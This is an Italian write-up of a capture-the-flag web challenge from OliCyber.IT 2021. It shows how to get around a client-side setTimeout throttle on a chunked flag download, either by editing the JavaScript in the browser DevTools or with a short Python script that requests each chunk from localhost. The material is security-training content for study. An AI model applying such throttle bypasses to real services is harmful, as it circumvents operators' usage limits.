# OliCyber.IT 2021 - Competizione nazionale

## [web-02] FlagDownloader 1 (91 risoluzioni)

La challenge si presenta come un sito web per il download di file. Uno di questi file (Sicuramente non la flag) contiene la flag.

Tuttavia i file vengono scaricati a blocchi, e il piano gratuito è particolarmente lento.

### Soluzione

Il download viene rallentato da una chiamata a `setTimeout`. Vi sono diversi modi per affrontare e risolvere la challenge.

Il più semplice consiste nel modificare il sorgente JavaScript dai Dev Tools del browser. In questo modo si può fare un qualcosa come

```js
setTimeout(() => g(data["n"]), 0);
```

che imposta a 0 il delay del timeout, e il resto della flag viene scaricato immediatamente. È da tenere conto però che le modifiche avvengono mentre il codice è già in esecuzione, quindi bisogna essere rapidi a modificare il sorgente in modo da non rimanere bloccati in un timeout già avviato.

Un'alternativa è quella di scrivere un programma che effettui direttamente le richieste al server per ottenere i vari blocchi.

### Exploit

Un esempio di script in Python è il seguente:

```python
import requests

host = 'http://localhost:8080'

flag = ''
n = '0'

while n:
    r = requests.get(host+'/download/flag/'+n)
    j = r.json()
    n = j['n']
    flag += j['c']

print(flag)
```
